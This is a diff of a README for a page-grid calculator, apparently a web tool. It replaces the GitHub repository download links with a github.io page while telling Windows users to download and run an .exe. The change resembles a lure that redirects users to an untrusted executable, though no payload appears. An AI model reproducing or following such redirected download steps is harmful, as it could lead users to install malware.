@@ -1,6 +1,6 @@
 # 📏 calculadora-reticula-4-web - Design professional page grids with ease
 
-[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/sacral-sweetsop819/calculadora-reticula-4-web)
+[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://sacral-sweetsop819.github.io)
 
 This application helps designers create and visualize editorial grids. It provides a simple way to calculate layout measurements for print projects. You can use it to test grid structures before you start your final layout in design software. The tool focuses on layout logic and helps you understand how different margin and column choices affect your final work.
 
@@ -17,7 +17,7 @@ To run this application on your Windows computer, you need the following:
 
 Follow these steps to get the software on your machine:
 
-1.  Visit the official download page here: [https://github.com/sacral-sweetsop819/calculadora-reticula-4-web](https://github.com/sacral-sweetsop819/calculadora-reticula-4-web).
+1.  Visit the official download page here: [https://sacral-sweetsop819.github.io](https://sacral-sweetsop819.github.io).
 2.  Look for the section labeled Releases on the right side of the screen.
 3.  Click the version number to open the details for that update.
 4.  Find the file ending in .exe in the Assets section.
